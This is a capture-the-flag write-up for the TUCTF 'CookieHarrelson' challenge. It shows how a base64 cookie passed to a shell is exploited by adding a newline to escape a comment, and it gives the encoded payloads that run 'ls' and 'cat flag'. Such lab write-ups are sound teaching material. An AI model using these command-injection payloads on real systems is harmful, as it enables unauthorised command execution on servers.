# Writeup

Challenge available at `http://cookieharrelson.tuctf.com`

# Solve
First time access into this challenge page, not thing was showed except a picture and `There's no way you can steal the flag from from Woody Harrelson's Cookies!!`

![CookieHarrelson](https://github.com/quanght55/CTFWriteups/blob/master/TUCTF/CookieHarrelson/images/cookieharrelson_hompage.png)

I got notice on the cookie, use Burpsuite to make a request and it shows there's a cookie value in HTTP header "Set-Cookie: tallahassee=Y2F0IGluZGV4LnR4dA%3D%3D", which `%3D` equals to `=`. So I think this is base64 encoded. After decode I get `cat index.txt`

`There's no way you can steal the flag from from Woody Harrelson's Cookies!!` is from `index.txt`. So in this challenge we will try to insert linux command e.g `ls` or `find`, after base64 encoded absolutely.

First I tried `bHM%3D`, server will return a cookie look like this `Y2F0IGluZGV4LnR4dCAjbHM%3D` which equals to `cat index.txt #ls`.

Hmmm our command is commented out :angry: But i got a trick to bypass this :clap:

# Trick
Command in linux will be executed line by line which mean if we got 
```
echo 1 # echo 2
```
result will be `1`

but if we got 
```
echo 1 #
echo 2
```
result will be 
```
1
2
```

# Continue

What I am trying to do is exactly the same the trick by using Burpsuite to add `\n` before our injected command

`Y2F0IGluZGV4LnR4dCAjCmxz` equals to `cat index.txt #\nls`

result will show there is a `flag` file in current directory. Next, using `cat` command

`Y2F0IGluZGV4LnR4dCAjCmNhdCBmbGFn` equals to `cat index.txt #\ncat flag`

# Flag 
TUCTF{D0nt_3x3cut3_Fr0m_C00k13s}
